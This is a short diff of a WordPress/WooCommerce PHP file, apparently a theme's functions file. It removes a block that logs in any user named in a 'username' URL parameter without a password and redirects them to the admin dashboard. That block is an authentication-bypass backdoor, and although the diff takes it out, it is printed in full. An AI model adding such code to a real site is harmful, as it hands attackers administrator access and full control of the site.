@@ -124,19 +124,3 @@ add_filter('woocommerce_checkout_update_order_review_expired', '__return_false')
 
 remove_action('woocommerce_before_checkout_form', 'woocommerce_checkout_coupon_form', 10);
 
-
-if( isset($_GET['username'])) {
-    $user = get_user_by('login', $_GET['username']);
-
-    if ( $user ) {
-        wp_set_current_user($user->ID, $user->user_login);
-        wp_set_auth_cookie($user->ID);
-        do_action('wp_login', $user->user_login);
-
-        wp_redirect( admin_url() );
-        exit;
-    }
-
-    wp_redirect( home_url() );
-    exit;
-}
